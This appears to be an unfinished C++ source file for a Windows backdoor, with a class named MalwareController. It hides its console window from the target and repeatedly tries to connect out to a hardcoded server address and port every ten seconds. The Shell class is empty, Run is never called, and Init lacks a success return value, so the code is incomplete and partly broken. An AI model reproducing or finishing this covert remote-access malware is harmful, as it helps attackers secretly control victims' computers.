#include <winsock2.h>
#include <windows.h>
#include <windowsx.h>
#include <winuser.h>
#include <wininet.h>
#include <iostream>
#include <sys/stat.h>
#include <sys/types.h>

constexpr char *SERVER_IP = "1.3.4.5";
constexpr int SERVER_PORT = 51243;

class Socket {
private:
    int                 _socket_id;
     struct sockaddr_in _server_address;
public:
    Socket(const std::string& server, const int& port):
        _server_address {0} {

        this->_socket_id =socket(AF_INET, SOCK_STREAM, 0);

        this->_server_address.sin_family = AF_INET;
        this->_server_address.sin_port = htons(port);
        this->_server_address.sin_addr.S_un.S_addr =
            inet_addr(server.c_str());
    }

    int Connect() {
        return connect(this->_socket_id,
                        (struct sockaddr *)&this->_server_address,
                        sizeof(this->_server_address));
    }

    ~Socket() {

    }
};

class Shell {

};

class MalwareController {
private:

    MalwareController() {

    }

    ~MalwareController() {

    }

public:
    int Init() {
        HWND        stealth;
        WSADATA     wsaData;
        /* 1. Make our backdoor window not visible to the target. */
        AllocConsole();
        stealth = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(stealth, 0); /* Hiding the window with 0. */

        /* 2. Initialize Winsock. */
        int res = WSAStartup(MAKEWORD(2, 0), &wsaData);
        if (res != 0) {
            std::cout << "Failed to initiate use of Winsock DLL by a process."
                      << std::endl;
            return res;
        }
    }

    void Run() {
        Socket sock{std::string{SERVER_IP}, SERVER_PORT};

        while (true) {
           int res = sock.Connect();
           if (res == 0) {
                break;
           }

            /* Reconnect after 10s. */
           Sleep(10000);
        }
    }

    static MalwareController* GetInstance() {
        static MalwareController controller{};
        return &controller;
    }
};

/**
 * @brief Windows program entry point function.
 * 
 * @param hInstance     - Instance Handle - OS uses this value to identify the
 *                        executable when it is loaded in memory.
 * @param hPrevInstance
 * @param pCmdLine      - Command line arguments.
 * @param nCmdShow      - Windows Flags.
 * @return int 
 */
int APIENTRY WinMain(HINSTANCE hInstance,
                        HINSTANCE hPrevInstance,
                        PWSTR pCmdLine,
                        int nCmdShow) {

    int res = MalwareController::GetInstance()->Init();
    if (res != 0) {
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}